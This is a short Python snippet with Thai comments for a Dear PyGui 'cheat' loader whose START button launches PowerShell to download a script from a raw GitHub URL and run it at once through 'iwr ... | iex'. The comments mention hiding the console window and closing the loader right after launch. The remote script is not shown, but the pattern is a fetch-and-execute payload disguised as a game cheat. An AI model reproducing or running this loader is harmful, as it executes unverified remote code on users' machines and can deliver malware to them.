import subprocess
import dearpygui.dearpygui as dpg

# --- ฟังก์ชันสำหรับรัน PowerShell (ดึงมาจากรูปของคุณ) ---
def start_cheat_callback():
    print("กำลังเชื่อมต่อเซิร์ฟเวอร์และเริ่มทำงาน...")
    
    # คำสั่งดึงสคริปต์จาก GitHub มาใช้งาน
    powershell_command = 'iwr "https://raw.githubusercontent.com/lubyralph6-maker/newpower.ps1/refs/heads/main/newpower.ps1" | iex'
    
    try:
        # สั่งรัน PowerShell แบบซ่อนหน้าต่างดำ (หรือจะโชว์ก็ได้)
        subprocess.Popen(["powershell", "-Command", powershell_command], creationflags=subprocess.CREATE_NEW_CONSOLE)
        
        # ปิดหน้า Loader ทันทีที่รันสคริปต์ (เปิดใช้ถ้าต้องการ)
        # dpg.stop_dearpygui()
        
    except Exception as e:
        print(f"เกิดข้อผิดพลาด: {e}")

# --- ในหน้า MainWindow (ส่วนของปุ่ม START) ---
# ให้คุณไปแก้ตรงปุ่ม m_start ในโค้ดเดิมของคุณเป็นแบบนี้:

# dpg.add_button(tag="m_start", pos=main_start_pos, width=180, height=50, 
#                callback=start_cheat_callback) # เรียกใช้ฟังก์ชันด้านบน
